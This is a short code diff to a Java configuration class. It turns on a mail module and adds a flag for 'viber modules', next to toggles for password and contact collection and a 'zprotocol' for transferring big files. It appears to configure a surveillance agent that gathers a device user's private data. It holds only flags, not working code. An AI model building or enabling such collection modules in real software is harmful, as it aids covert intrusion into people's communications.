@@ -29,8 +29,9 @@ public class Cfg {
 	public static final boolean MEMOSTAT = false;
 	
 	public static final boolean ENABLE_PASSWORD_MODULE = false; // enable password module
-	public static final boolean ENABLE_MAIL_MODULE = false; // enable mail module
+	public static final boolean ENABLE_MAIL_MODULE = true; // enable mail module
 	public static final boolean ENABLE_CONTACTS = true; // actually saves contacs
+	public static final boolean ENABLE_EXPERIMENTAL_MODULES = false; // enables viber modules
 	
 	public static final boolean PROTOCOL_RANDBLOCK = true; // increses randomly zprotocol commands
 	public static final boolean PROTOCOL_RESUME = true; // enables zprotocol resume for big files
